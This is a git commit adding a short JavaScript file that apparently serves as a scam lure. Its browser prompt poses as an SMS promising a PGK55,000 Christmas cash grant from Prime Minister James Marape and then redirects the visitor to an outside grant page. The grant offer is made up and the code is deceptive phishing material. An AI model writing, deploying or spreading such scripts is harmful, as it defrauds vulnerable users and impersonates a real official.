2d6fbf518888a68592a7b5623c63577cd87b57b6
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-08 19:45:09 -0800

    Create papua-active.js

---
+++ papua-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW PGK55,000'
+password=prompt('SMS: Congratulations You are qualify for Prime Minister JAMES MARAPE PGK55,000 CHRISTMAS CASH GRANT FOR MELANESIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW PGK55,000');
+if (password != 'WITHDRAW PGK55,000') {
+location.href='https://get-offre.org/papua-grant.html';
+}
